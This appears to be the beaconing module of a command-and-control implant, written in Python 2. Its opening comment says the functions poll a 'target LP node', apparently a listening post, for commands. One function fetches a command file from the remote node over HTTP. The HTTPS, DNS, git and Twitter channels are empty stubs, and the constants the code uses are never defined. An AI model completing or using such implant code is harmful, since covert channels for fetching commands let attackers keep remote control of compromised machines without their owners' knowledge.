#!/usr/bin/env python

#
# these funcitons implement the different communication protocols that poll the target LP node for commands
#

import httplib
from socket import error as socket_error

def http_get_beacon(self, node):
		
		conn = httplib.HTTPConnection(node, timeout=CON_TIMEOUT)
		conn.request("GET", COMMAND_FILE)
		response = conn.getresponse()

		if response.status != httplib.OK:
			raise httplib.HTTPException

		data = response.read()
		conn.close()
		return data

def https_get_beacon(self, node):
	pass

def dns_beacon(self, node):
	pass

def git_beacon(self, node):
	pass

def twitter_beacon(self, node):
	pass
